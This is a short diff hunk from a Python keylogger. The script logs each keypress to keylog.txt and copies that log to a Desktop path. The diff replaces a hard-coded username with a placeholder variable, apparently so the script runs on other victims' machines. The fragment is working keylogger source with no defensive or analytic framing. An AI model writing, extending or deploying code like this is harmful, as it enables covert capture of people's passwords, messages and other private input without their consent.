@@ -73,7 +73,7 @@ import logging
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 import shutil
 src_file = "keylog.txt"
-dst_file = "C:\\Users\\Ferhad\\Desktop\\deneme.txt"  
+dst_file = "C:\\Users\\{istiface_adi}\\Desktop\\deneme.txt"  
 shutil.copy(src_file, dst_file)
 def on_press(key):
     logging.info(str(key))
